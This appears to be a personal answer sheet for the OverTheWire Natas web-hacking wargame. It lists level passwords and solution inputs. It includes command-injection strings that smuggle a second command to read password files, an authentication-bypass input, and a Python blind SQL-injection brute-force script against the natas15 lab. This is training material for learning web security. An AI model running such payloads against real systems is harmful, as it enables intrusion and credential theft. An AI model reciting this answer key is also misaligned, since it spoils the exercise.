# Natas War Games

## Passwords and Commands

### Level 0
```natas0```

### Level 1
```0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq```

### Level 2
```TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI```

### Level 3
```3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH```

### Level 4
```QryZXc2e0zahULdHrtHxzyYkj59kUxLQ```

### Level 5
```0n35PkggAPm2zbEpOU802c0x0Msn1ToK```

### Level 6
```0RoJwHdSKWFTYR5WuiAewauSuNaBXned```

### Level 7
```bmg8SvU1LizuWjx3y7xkNERkHxGre0GS```

### Level 8
```xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q```

### Level 9
```ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t```

```
; cat /etc/natas_webpass/natas10 #
```

### Level 10
```t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu```

```
.* /etc/natas_webpass/natas11 #
```

### Level 11
```UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk```

### Level 12
```yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB```

### Level 13
```trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC```

### Level 14
```z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ```

```
username = "="
password = "="
```

### Level 15
```SdqIqBsFcz3yotlNYErZSZwblkm0lrvx```

```
#!/usr/bin/env python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

# Step 1: Find characters that exist in the password
for x in chars:
    params = {
        'username': 'natas16" AND password LIKE BINARY "%{}%" "'.format(x)
    }
    r = requests.get(target, params=params, verify=False)
    if trueStr in r.text:
        exist += x
        print('Using: ' + exist)

print('All characters used. Starting brute force... Grab a coffee, might take a while!')

# Step 2: Brute force the password character by character
for i in range(32):
    found = False
    for c in exist:
        test_password = password + c
        params = {
            'username': 'natas16" AND password LIKE BINARY "{}%" "'.format(test_password)
        }
        r = requests.get(target, params=params, verify=False)
        if trueStr in r.text:
            password += c
            print('Password: ' + password + '*' * int(32 - len(password)))
            found = True
            break
    if not found:
        print('Password not found. Exiting...')
        break

print('Completed!')
```

### Level 16
```hPkjKYviLQctEW33QmuXL6eDVfMW4sGo```